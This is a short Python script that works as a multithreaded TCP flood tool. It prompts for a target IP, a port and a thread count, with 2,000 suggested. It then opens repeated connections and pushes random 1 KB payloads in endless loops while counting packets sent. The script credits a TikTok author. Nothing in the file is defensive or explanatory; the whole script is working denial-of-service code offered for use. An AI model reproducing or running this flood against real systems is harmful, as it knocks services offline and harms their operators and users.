import socket
import threading
import time
import random
import string
import os

TARGET_IP = input("TARGET IP: ")
TARGET_PORT = int(input("OPEN PORT: "))
NUM_THREADS = int(input("THREADS (2000 SUGGESTED): "))
os.system("clear")
print(f"🚀 TCP flood started at {TARGET_IP}:{TARGET_PORT} with {NUM_THREADS} threads. Stop with Ctrl+C.\n(MADE BY apexvr_ ON TIKTOK)")

def random_payload(size=1024):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size)).encode()

packet_count = 0
packet_count_lock = threading.Lock()

def tcp_flood():
    global packet_count
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((TARGET_IP, TARGET_PORT))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            while True:
                s.sendall(random_payload(1024))
                with packet_count_lock:
                    packet_count += 1
                    print(f"[-] Packet sent... ({packet_count})")
        except Exception:
            s.close()
            time.sleep(0.05)

threads = []
for i in range(NUM_THREADS):
    t = threading.Thread(target=tcp_flood, name=f"Wątek-{i+1}", daemon=True)
    t.start()
    threads.append(t)

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n✅ Flood ended (Ctrl+C)")
